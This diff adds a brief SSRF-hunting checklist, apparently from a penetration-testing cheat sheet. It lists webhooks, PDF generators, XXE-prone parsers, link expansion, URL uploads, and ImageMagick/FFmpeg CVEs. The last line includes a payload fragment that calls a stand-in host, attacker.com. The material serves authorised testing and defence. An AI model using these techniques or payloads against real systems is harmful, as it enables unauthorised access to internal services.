@@ -1,0 +1,16 @@
+Webhooks: Look for services that make HTTP requests when certain events happen. In most webhook features, the
+end user can choose their own endpoint and hostname. Try to send HTTP requests to internal services.
+
+PDF generators: Try injecting <iframe>, <img>, <base> or <script> elements or CSS url() functions pointing to
+internal services.
+
+Document parsers: Try to discover how the document is parsed. In case it’s an document such as XML External Entity
+(XXE), use the PDF generator approach. For all other documents, see if there’s a way to reference external resources
+and let the server make requests to an internal service.
+
+Link expansion: Try looking for features that get you a web page for link input, example: Twitter.
+
+File uploads: Instead of uploading a file, try sending a URL and see if it downloads the content of the file.
+
+Image / Video converters : Image magick : CVE-2016–3718(fill 'url(http://attacker.com/)') CVE-2016–3718 /
+FFMPEG : CVE-2017–9993 (gen_xbin_playlist(playlist_location))
